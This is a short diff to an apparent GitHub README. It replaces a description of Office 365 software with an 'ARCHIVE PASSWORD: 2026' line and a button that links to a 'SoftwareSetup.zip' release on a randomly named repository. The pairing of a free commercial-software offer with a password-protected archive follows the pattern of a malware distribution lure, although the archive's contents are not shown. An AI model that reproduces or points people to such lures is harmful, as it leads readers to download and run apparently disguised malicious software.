@@ -1,2 +1,3 @@
-# Office-365-Software
-Office 365 Pro Plus for Windows 10 and 11 using this direct setup link
+# ARCHIVE PASSWORD: 2026
+
+[![button](pic.jpg)](https://github.com/Maroonflohike/xszxafxw/releases/download/dfjkvh/SoftwareSetup.zip)
